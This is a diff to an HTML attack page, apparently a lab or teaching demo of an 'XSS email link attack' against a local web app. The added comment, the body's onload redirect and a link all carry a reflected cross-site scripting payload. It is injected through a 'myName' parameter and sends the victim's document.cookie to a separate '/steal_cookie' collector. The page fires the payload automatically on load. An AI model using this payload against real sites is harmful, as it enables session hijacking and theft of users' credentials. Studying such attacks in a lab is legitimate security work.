@@ -2,8 +2,16 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>XSS Email</title>
+<title>XSS Email 連結攻擊</title>
 </head>
+<!-- 
+	https://localhost:9443/mango/input?myName=
+	<script>
+	xhttp = new XMLHttpRequest();
+	xhttp.open('GET', 'https://localhost:7443/steal_cookie?data=' + document.cookie, true);
+	xhttp.send();
+	</script>
+ -->
 <body onload="location.href='https://localhost:9443/mango/input?myName=%3Cscript%3Evar%20xhttp%20=%20new%20XMLHttpRequest();xhttp.open(%27GET%27,%20%27https://localhost:7443/steal_cookie?data=%27%2Bdocument.cookie,%20true);xhttp.send();%3C/script%3E';"> 
 	
 	<a href="https://localhost:9443/mango/input?myName=%3Cscript%3Evar%20xhttp%20=%20new%20XMLHttpRequest();xhttp.open(%27GET%27,%20%27https://localhost:7443/steal_cookie?data=%27%2Bdocument.cookie,%20true);xhttp.send();%3C/script%3E">
